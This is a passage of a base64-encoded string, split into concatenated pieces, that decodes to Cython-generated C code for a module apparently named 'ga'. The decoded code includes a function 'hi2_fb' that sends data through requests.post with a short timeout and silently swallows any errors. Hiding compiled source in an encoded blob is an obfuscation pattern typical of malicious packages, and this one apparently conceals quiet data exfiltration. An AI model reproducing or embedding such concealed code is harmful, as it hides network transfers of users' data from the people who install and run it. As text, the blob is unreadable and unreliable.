5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA1NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA1NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19weXhfdF85ID0gMTsKICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF84KSkpIHsKICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzgpOwogICAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF84KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF81KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfOCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDIgOiAwKV0gPSB7X19w""eXhfdF81LCBfX3B5eF92X0F9OwogICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDU3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X0IsIF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAwKSBfX1BZWF9FUlIoMCwgNTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWVvdXQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF81LCBfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgMCkgX19QWVhfRVJSKDAsIDU3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF84LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDU3LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgfQogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgZ290byBfX3B5eF9MOF90cnlfZW5kOwogICAgX19weXhfTDNfZXJyb3I6OwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgIAogICAgIHsKICAgICAgX19QeXhfRXJyUmVzdG9yZSgwLDAsMCk7CiAgICAgIGdvdG8gX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICB9CiAgICBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDo7CiAgICBfX1B5eF9Y""R0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTsKICAgIF9fcHl4X0w4X3RyeV9lbmQ6OwogIH0KCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X0EpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9CKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yZ2FfM2hpMl9mYihQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJnYV8zaGkyX2ZiID0geyJoaTJfZmIiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJnYV8zaGkyX2ZiLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJnYV8zaGkyX2ZiKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF92X3RocmVhZF9pZCA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJoaTJfZmIgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4""X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkX2lkLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MM19lcnJvcikKICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHsKICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykgewogICAgICAgIGNhc2UgIDE6CiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMDogYnJlYWs7CiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgICAgfQogICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzOwogICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiaGkyX2ZiIiwgMCkgPCAwKSBfX1BZWF9FUlIoMCwgNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJoaTJfZmIiLCAxLCAxLCAxLCBpKTsgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MM19lcnJvcikgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7CiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICB9IGVsc2UgewogICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDYyLCBfX3B5eF9MM19lcnJvcikKICAgIH0KICAgIF9fcHl4X3ZfdGhyZWFkX2lkID0gdmFsdWVzWzBdOwogIH0KICBnb3RvIF9fcHl4X0w2X3NraXA7CiAgX19weXhfTDVfYXJndHVwbGVfZXJy""b3I6OwogIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJoaTJfZmIiLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCA2MiwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soImdhLmhpMl9mYiIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBOVUxMOwogIF9fcHl4X0w0X2FyZ3VtZW50X3VucGFja2luZ19kb25lOjsKICBfX3B5eF9yID0gX19weXhfcGZfMmdhXzJoaTJfZmIoX19weXhfc2VsZiwgX19weXhfdl90aHJlYWRfaWQpOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMmdhXzZoaTJfZmJfMmdlbmVyYXRvcihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmdhXzZoaTJfZmJfZ2VuZXhwcihDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfZ2VuZXhwcl9hcmdfMCkgewogIHN0cnVjdCBfX3B5eF9vYmpfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBfX3B5eF9jdXJfc2NvcGUgPSAoc3RydWN0IF9fcHl4X29ial8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopX19weXhfdHBfbmV3XzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfcHR5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwciwgX19weXhfbXN0YXRlX2dsb2Jh""bC0+X19weXhfZW1wdHlfdHVwbGUsIE5VTEwpOwogIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkgewogICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKilQeV9Ob25lKTsKICAgIF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICAgIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDFfZXJyb3IpCiAgfSBlbHNlIHsKICAgIF9fUHl4X0dPVFJFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIH0KICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOwogIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IF9fUHl4X0dlbmVyYXRvcl9OZXcoKF9fcHl4X2Nvcm91dGluZV9ib2R5X3QpIF9fcHl4X2diXzJnYV82aGkyX2ZiXzJnZW5lcmF0b3IsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSksIChQeU9iamVjdCAqKSBfX3B5eF9jdXJfc2NvcGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGkyX2ZiX2xvY2Fsc19nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2EpOyBpZiAodW5saWtlbHkoIWdlbikpIF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfY3VyX3Njb3BlKTsKICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47CiAgfQoKICAKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJnYS5oaTJfZmIuZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X0RFQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJnYV82aGkyX2ZiXzJnZW5lcmF0b3IoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpfX3B5eF9nZW5lcmF0b3IsIENZVEhPTl9VTlVTRUQgUHlUaHJlYWRTdGF0ZSAqX19weXhfdHN0YXRlLCBQeU9iamVjdCAqX19weXhfc2VudF92YWx1ZSkgCnsKICBzdHJ1Y3QgX19weXhfb2JqXzJnYV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJl""KTsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlfc3NpemVfdCBfX3B5eF90XzI7CiAgUHlPYmplY3QgKigqX19weXhfdF8zKShQeU9iamVjdCAqKTsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF84OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApOwogIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHsKICAgIGNhc2UgMDogZ290byBfX3B5eF9MM19maXJzdF9ydW47CiAgICBkZWZhdWx0OiAKICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogICAgcmV0dXJuIE5VTEw7CiAgfQogIF9fcHl4X0wzX2ZpcnN0X3J1bjo7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9zZW50X3ZhbHVlKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfcik7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCA2OSwgX19weXhfTDFfZXJyb3IpIH0KICBpZiAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHx8IFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7CiAgICBfX3B5eF90XzEgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzA7IF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgX19weXhfdF8yID0gMDsKICAgIF9fcHl4X3RfMyA9IE5VTEw7CiAgfSBlbHNlIHsKICAgIF9fcHl4X3RfMiA9IC0xOyBfX3B5eF90XzEgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgX19weXhfdF8zID0gKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpID8gUHlJdGVyX05leHQgOiBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoX19weXhfdF8xKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wx""X2Vycm9yKQogIH0KICBmb3IgKDs7KSB7CiAgICBpZiAobGlrZWx5KCFfX3B5eF90XzMpKSB7CiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHsKICAgICAgICB7CiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeUxpc3RfR0VUX1NJWkUoX19weXhfdF8xKTsKICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgICNlbmRpZgogICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhazsKICAgICAgICB9CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF8xLCBfX3B5eF90XzIpOwogICAgICAgICsrX19weXhfdF8yOwogICAgICB9IGVsc2UgewogICAgICAgIHsKICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoX19weXhfdF8xKTsKICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgICNlbmRpZgogICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhazsKICAgICAgICB9CiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTsKICAgICAgICAjZWxzZQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMik7CiAgICAgICAgI2VuZGlmCiAgICAgICAgKytfX3B5eF90XzI7CiAgICAgIH0KICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxX2Vycm9yKQogICAgfSBlbHNlIHsKICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgewogICAgICAgIFB5T2JqZWN0KiBleGNfdHlwZSA9IFB5RXJyX09jY3VycmVkKCk7CiAgICAgICAgaWYgKGV4Y190eXBlKSB7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhleGNfdHlwZSwgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICB9CiAgICAgICAgYnJlYWs7CiAgICAgIH0KICAgIH0KICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfQSk7CiAgICBfX1B5""eF9YREVDUkVGX1NFVChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfQSwgX19weXhfdF80KTsKICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF80KTsKICAgIF9fcHl4X3RfNCA9IDA7CiAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jYyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDY5LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9GKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNjksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX3B5eF90XzggPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fc